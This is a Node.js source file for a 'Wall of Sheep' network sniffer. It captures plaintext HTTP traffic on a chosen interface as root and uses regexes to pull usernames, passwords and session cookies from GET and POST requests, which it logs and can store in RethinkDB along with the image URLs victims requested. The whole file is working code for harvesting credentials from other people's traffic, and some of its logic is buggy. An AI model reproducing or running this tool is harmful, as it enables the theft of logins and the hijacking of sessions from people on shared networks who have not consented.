/**File:           sniffer.js
 Author:         magerx@paxmac.org
 Last modified:  2017/07/14
 */

var qs = require("querystring");
var protocol = require("./protocol");
var logger = require("./util/logger");
var pcap = require("pcap");
var argv = require("minimist")(process.argv.slice(2));
var request = require("request");

if (argv.s) {
    var User = require("./models/user");
    logger.info("Loading RethinkDB module.");
}

function getSecrets(data) {
    var account = null;
    var password = null;

    var reg_user = new RegExp("[_\w]*?(?:login|name|sign|account|user|mail|member)[_\w]*?", "i");
    var reg_pass = new RegExp("[_\w]*?(?:password|passwd|pwd|secret|pass)[_\w]*?", "i");

    var keys = Object.keys(data);

    for (var i = 0; i < keys.length; i++) {
        var param = keys[i];
        if (reg_pass.test(param)) {
            password = data[param];
        }
        else if (reg_user.test(param)) {
            account = data[param];
        }
    }
    return [account, password];
}

function HTTPDataParser(packet) {
    var linkLayer = packet.payload;
    var networkLayer = packet.payload.payload;
    var tranportLayer = packet.payload.payload.payload;

    var data = tranportLayer.data.toString("ascii");
    var shost = linkLayer.shost.toString("ascii");
    var saddr = networkLayer.saddr.toString("ascii");
    var daddr = networkLayer.daddr.toString("ascii");
    var sport = tranportLayer.sport;
    var dport = tranportLayer.dport;

    var isPOST = data.indexOf("POST");
    var isGET = data.indexOf("GET");

    if (!(isPOST && isGET)) {
        var headerContent = data.split("\r\n");

        // get cookie
        var cookies = null;
        var picture = null;

        for (var header in headerContent) {
            var httpHeader = headerContent[header];
            if (httpHeader.indexOf("Host:") === 0) {
                var domain = httpHeader.split(": ")[1];
            }
            else if (httpHeader.indexOf("Cookie:") === 0) {
                cookies = httpHeader.split(": ")[1];
            }
        }
        // returns the last element (querystring) and removes it from the array
        if (isPOST === 0) {
            var content = headerContent.pop();
        }
        // get querystring for get method
        else {
            var firstLine = headerContent[0];
            var uri = firstLine.split(" ")[1];
            var urlParse = uri.split("?");
            var path = urlParse[0];
            content = urlParse[1];

            var pattern = new RegExp("\.(jpg|png|gif|jpeg|bmp)$", "i");

            if (pattern.test(path)) {
                picture = "http://" + domain + uri;
                request.head(picture, function (error, response) {
                    var status = response.statusCode;
                    if (!error && status === 200) {
                        var picture = picture;
                    }
                    else {
                        picture = null;
                    }
                })
            }

        }

        var sheepInfo = qs.parse(content);
        var secrets = getSecrets(sheepInfo);
        var account = secrets[0];
        var password = secrets[1];

        var obj = {};

        if (password || cookies) {
            logger.info("[%s:%s:%d -> %s:%d] [%s] [Account: %s, Passwrod: %s] [Cookie: %s] [Domain: %s]",
                shost, saddr, sport, daddr, dport, protocol[dport], account, password, cookies, domain);

            obj.shost = shost;
            obj.srcIP = saddr;
            obj.dstIP = daddr;
            obj.sport = sport;
            obj.dport = dport;
            obj.user = account;
            obj.pass = password;
            obj.cookies = cookies;
            obj.domain = domain;
            obj.picture = picture;
        }

        return obj;
    }
}

function SavetoRethinkDB(beSaved) {
    // If HTTPDataParser can not get cookie, password, picture given null do not save
    if (beSaved.cookies || beSaved.password || beSaved.picture) {
        var userInfo = new User({
            timestamp: Date.now().toString(),
            shost: beSaved.shost,
            sIP: beSaved.srcIP,
            dIP: beSaved.dstIP,
            sPort: beSaved.sport,
            dPort: beSaved.dport,
            protocol: protocol[beSaved.dport],
            login: beSaved.user || null,
            password: beSaved.pass || null,
            cookies: beSaved.cookies,
            domain: beSaved.domain,
            picture: beSaved.picture
        });

        userInfo.save().then(function () {
            logger.debug("Save to RethinkDB or not: %s", userInfo.isSaved());
            logger.debug("Data id: %s", userInfo.id);
            logger.debug(userInfo);
        });
    }
}

function WelcomeMessage() {
    console.log("  _       _____    __    __       ____  ______   _____ __  __________________");
    console.log("| |     / /   |  / /   / /      / __ \\/ ____/  / ___// / / / ____/ ____/ __  \\");
    console.log("| | /| / / /| | / /   / /      / / / / /_      \\__ \\/ /_/ / __/ / __/ / /_/ /");
    console.log("| |/ |/ / ___ |/ /___/ /___   / /_/ / __/     ___/ / __  / /___/ /___/ ____/ ");
    console.log("|__/|__/_/  |_/_____/_____/   \\____/_/       /____/_/ /_/_____/_____/_/      ");
}

function StartCapture() {
    WelcomeMessage();

    if (process.getuid() !== 0) {
        logger.warn("Please run as root");
        process.exit(1);
    }

    if (!argv.i) {
        logger.warn("Specify an interface for capturing.");
        process.exit(1);
    }
    else {
        var pcapSession = pcap.createSession(argv.i, "ip proto \\tcp");

        logger.info("Using interface: %s", pcapSession.device_name);

        pcapSession.on("packet", function (rawPacket) {
            var packet = pcap.decode.packet(rawPacket);
            var tranportLayer = packet.payload.payload.payload;
            var isHTTP = tranportLayer.dport === 80 && tranportLayer.data !== null;

            // For all protocols we interested and also data not null
            if (isHTTP) {
                var HTTPInfoObj = new HTTPDataParser(packet);
                if (argv.s && HTTPInfoObj) {
                    SavetoRethinkDB(HTTPInfoObj);
                }
            }
        });
    }
}

StartCapture();